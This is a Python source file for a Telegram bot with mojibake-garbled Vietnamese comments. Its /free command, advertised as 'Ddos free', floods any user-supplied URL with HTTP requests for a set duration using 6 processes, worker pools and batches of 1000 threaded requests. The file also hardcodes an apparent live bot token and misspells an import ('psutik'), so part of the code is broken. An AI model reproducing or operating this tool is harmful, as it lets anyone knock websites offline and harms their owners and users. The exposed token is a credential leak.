import telebot
import requests
import time
import psutik
import multiprocessing
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore

# Kh·ªüi t·∫°o colorama
init(autoreset=True)

# Token c·ªßa bot Telegram
TOKEN = "7667637653:AAFzvUQvPUANTxss3_jwa2SMSfvWZVq6x9s"
bot = telebot.TeleBot(TOKEN)

# H√†m g·ª≠i m·ªôt y√™u c·∫ßu HTTP, v·ªõi x·ª≠ l√Ω ngo·∫°i l·ªá ƒë·ªÉ tr√°nh l·ªói treo
def send_request(url):
    try:
        response = requests.get(url, timeout=5)  # TƒÉng th·ªùi gian timeout ƒë·ªÉ ƒë·∫£m b·∫£o ·ªïn ƒë·ªãnh h∆°n
        print(Fore.GREEN + f"Tr·∫°ng th√°i {response.status_code}")
    except requests.RequestException as e:
        print(Fore.RED + f"L·ªói - {str(e)}")

# H√†m g·ª≠i y√™u c·∫ßu HTTP theo nh√≥m, v·ªõi qu·∫£n l√Ω l·ªói
def send_batch_requests(url, batch_size):
    with ThreadPoolExecutor(max_workers=batch_size) as executor:
        for _ in range(batch_size):
            executor.submit(send_request, url)
        time.sleep(0.5)  # Ngh·ªâ 0.5 gi√¢y gi·ªØa c√°c l·∫ßn g·ª≠i ƒë·ªÉ tr√°nh qu√° t·∫£i

# H√†m ch√≠nh g·ª≠i y√™u c·∫ßu HTTP li√™n t·ª•c trong th·ªùi gian quy ƒë·ªãnh, v·ªõi 6 ti·∫øn tr√¨nh song song
def send_requests_with_time_limit(url, duration):
    start_time = time.time()
    batch_size = 1000

    # H√†m ch·∫°y song song trong m·ªói ti·∫øn tr√¨nh (m·ªói "tab")
    def run_tab():
        with multiprocessing.Pool(processes=5) as pool:  # Gi·ªõi h·∫°n ti·∫øn tr√¨nh l√† 5 ƒë·ªÉ tr√°nh qu√° t·∫£i trong m·ªói tab
            while time.time() - start_time < duration:
                pool.apply_async(send_batch_requests, (url, batch_size))
                time.sleep(1)  # Ngh·ªâ 1 gi√¢y gi·ªØa c√°c l·∫ßn ch·∫°y ƒë·ªÉ tr√°nh qu√° t·∫£i

    # T·∫°o 6 ti·∫øn tr√¨nh song song (6 "tab" ch·∫°y c√πng l√∫c)
    processes = []
    for _ in range(6):
        process = multiprocessing.Process(target=run_tab)
        process.start()
        processes.append(process)

    # ƒê·ª£i c·∫£ 6 ti·∫øn tr√¨nh ho√†n th√†nh
    for process in processes:
        process.join()

    print(Fore.YELLOW + f"Ho√†n th√†nh g·ª≠i y√™u c·∫ßu t·ªõi {url} trong {duration} gi√¢y v·ªõi 6 tab.")

# L·ªánh /start ƒë·ªÉ ch√†o m·ª´ng ng∆∞·ªùi d√πng
@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "Ch√†o m·ª´ng!\n‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\nùó†ùó≤ùóªùòÇ ùóñùóºùó∫ùó∫ùóÆùóªùó± ‚òîÔ∏è\n#1: /free Ddos free")

# L·ªánh /free ƒë·ªÉ g·ª≠i y√™u c·∫ßu HTTP theo URL v√† th·ªùi gian ng∆∞·ªùi d√πng y√™u c·∫ßu
@bot.message_handler(commands=['free'])
def free(message):
    try:
        # T√°ch tin nh·∫Øn th√†nh c√°c ph·∫ßn t·ª≠
        args = message.text.split()
        if len(args) < 3:
            bot.reply_to(message, "Vui l√≤ng cung c·∫•p URL v√† th·ªùi gian. V√≠ d·ª•: /free http://example.com 60")
            return
        
        url = args[1]
        duration = int(args[2])
        
        bot.reply_to(message, f"‚öîÔ∏èAttacking the target‚öîÔ∏è\n‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\n‚Ü£Link: {url}\n‚Ü£Time: {duration}s")
        
        # G·ª≠i y√™u c·∫ßu HTTP v·ªõi 6 "tab" ch·∫°y song song
        send_requests_with_time_limit(url, duration)
        
        bot.reply_to(message, f"Ho√†n th√†nh T·∫•n c√¥ng\n‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\n‚Ü£Link: {url}\n‚Ü£Time: {duration}s.")
    except ValueError:
        bot.reply_to(message, "Th·ªùi gian ph·∫£i l√† m·ªôt s·ªë nguy√™n d∆∞∆°ng. Vui l√≤ng th·ª≠ l·∫°i.")


@bot.message_handler(commands=['cpu'])
def check_cpu(message):
 # Ki·ªÉm tra n·∫øu cu·ªôc tr√≤ chuy·ªán kh√¥ng ph·∫£i l√† lo·∫°i "group" ho·∫∑c "supergroup"
    # Ti·∫øp t·ª•c x·ª≠ l√Ω l·ªánh cpu ·ªü ƒë√¢y
    cpu_usage = psutil.cpu_percent(interval=1)
    memory_usage = psutil.virtual_memory().percent

    bot.reply_to(message, f'üñ•Ô∏è CPU Usage: {cpu_usage}%\nüíæ Memory Usage: {memory_usage}%')


# Kh·ªüi ƒë·ªông bot
bot.infinity_polling(timeout=60, long_polling_timeout = 1)